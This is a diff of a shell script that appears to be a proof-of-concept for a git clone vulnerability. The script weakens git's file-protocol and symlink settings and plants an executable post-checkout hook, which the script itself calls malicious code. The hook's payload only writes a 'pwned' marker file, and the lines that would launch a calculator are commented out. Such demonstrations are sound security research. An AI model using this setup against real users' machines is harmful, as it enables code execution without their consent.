@@ -3,9 +3,9 @@
 # Set Git configuration options
 git config --global protocol.file.allow always
 git config --global core.symlinks true
-# optional, but I added it to avoid the warning message
-git config --global init.defaultBranch main 
 
+# Optional, but I added it to avoid the warning message
+git config --global init.defaultBranch main
 
 # Define the tell-tale path
 tell_tale_path="$PWD/tell.tale"
@@ -18,9 +18,9 @@ mkdir -p y/hooks
 # Write the malicious code to a hook
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+echo "pwned" > /tmp/pwned.txt
+# calc.exe
+# open -a Calculator.app
 EOF
 
 # Make the hook executable: important
